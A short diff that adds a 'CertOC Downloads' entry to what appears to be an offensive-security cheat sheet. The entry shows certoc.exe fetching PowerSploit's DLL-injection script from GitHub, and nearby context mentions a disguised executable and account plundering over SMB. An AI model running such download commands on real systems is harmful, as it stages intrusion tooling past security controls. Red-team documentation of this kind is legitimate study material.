@@ -629,6 +629,13 @@ Output file: /tmp/definitely_legit.exe
 Signature appended. 
 FIN.
 ```
+## CertOC Downloads:
+
+Downloads text formatted files
+
+```
+certoc.exe -GetCACAPS https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-DllInjection.ps1
+```
 
 ## Plundering Account Information with RPCClient and SMBClient:
 
